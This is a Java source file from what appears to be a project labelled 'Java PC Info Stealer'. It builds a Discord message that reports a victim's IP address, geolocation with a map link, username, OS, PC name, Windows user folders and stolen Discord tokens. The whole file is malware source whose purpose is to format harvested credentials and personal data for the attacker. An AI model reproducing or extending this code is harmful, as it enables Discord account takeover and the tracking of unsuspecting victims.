package me.koenv.mw.discord;

import me.koenv.embed.Embed;
import me.koenv.mw.DesktopInfo;
import me.koenv.mw.Main;
import me.koenv.mw.NetworkManager;

public abstract class DcEmbeds {

    private static final Main main = Main.getMain();
    private static final String mapsUrl = Main.getMapsUrl();
    private static final DesktopInfo DI = Main.getDesktopInfo();
    private static final Tokens tokenLogger = Main.getDcTokens();
    private static final NetworkManager nM = Main.getNetworkManager();

    public static Embed pcInfoEmbed = new Embed.Builder()
            .title("**New Pc Information**")
            .url("https://koendev.tk/blog/malware#Java-Pc-Information-Stealer")
            .color("#04f33b")
            .field("**Ip Information                                           **",
                    "**IP:** ``" + nM.getJsonData().getString("query") + "``\n" +
                    "**Country:** ``" + nM.getJsonData().getString("countryCode") + "``\n" +
                    "**Region:** ``" + nM.getJsonData().getString("region") + "``\n" +
                    "**City:** ``" + nM.getJsonData().getString("city") + "``\n" +
                    "[**See On Google Maps**](" + mapsUrl + nM.getJsonData().getDouble("lat") + ',' + nM.getJsonData().getDouble("lon") + ")"
                    , true)

            .field("**Desktop Information                              **",
                    "**Username:** ``" + DI.getUser_name() + "``\n" +
                    "**OS:** ``" + DI.getOs_name() + "``\n" +
                    "**OS Version:** ``" + DI.getOs_version() + "``\n" +
                    "**Pc Name:** ``" + DI.getPc_name() + "``\n" +
                    "**Users (Win):** ``" + DI.getUsers_dir() + "``\n"
                    , true)

            .field("**Discord Tokens                                          **",
                    tokenLogger.getSb().toString()
                    , true)

            .footer("Java PC Info Stealer")
            .timestamp()
            .build();
}
